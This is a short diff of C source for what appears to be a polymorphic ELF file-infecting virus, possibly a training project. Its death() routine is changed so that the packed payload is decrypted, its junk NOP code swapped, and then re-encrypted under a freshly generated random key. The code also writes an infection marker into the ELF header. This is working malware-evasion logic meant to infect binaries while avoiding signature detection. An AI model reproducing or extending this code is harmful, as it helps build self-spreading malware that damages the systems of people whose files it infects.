@@ -27,6 +27,7 @@ size_t __attribute__((section(".text#"))) g_nb_junk = 0;
 uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
 uint16_t __attribute__((section(".text#"))) g_ri = 0;
 
+
 void junk_death(void);
 void junk_famine(void);
 void junk_war(void);
@@ -382,11 +383,17 @@ int death(saved_vars_t *vars, file_t *file) {
 	uint8_t *entry = self + vars->start_offset;
 
 	if (vars->is_encrypted) {
-		replace_nop_encrypt(entry, g_junk_offsets, vars->key);
-	} else {
+		uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
+		getrandom(key, KEY_SIZE, 0);
+		decrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, vars->key);
+		replace_nop(entry, g_junk_offsets);
+		encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
+		//replace_nop_encrypt(entry, g_junk_offsets, vars->key);
+	} else { // only for the first run of the main prog (like fill_offsets)
 		write_self_pos(entry);
-		uint8_t *new_key = encrypt_self(entry);
-		replace_nop_encrypt(entry, g_junk_offsets, new_key);
+		replace_nop(entry, g_junk_offsets);
+		encrypt_self(entry);
+		//replace_nop_encrypt(entry, g_junk_offsets, new_key);
 		*(uint32_t *)(Elf64_Ehdr *)(self + EI_PAD) = MAGIC_NUMBER; JUNK;
 	}
 
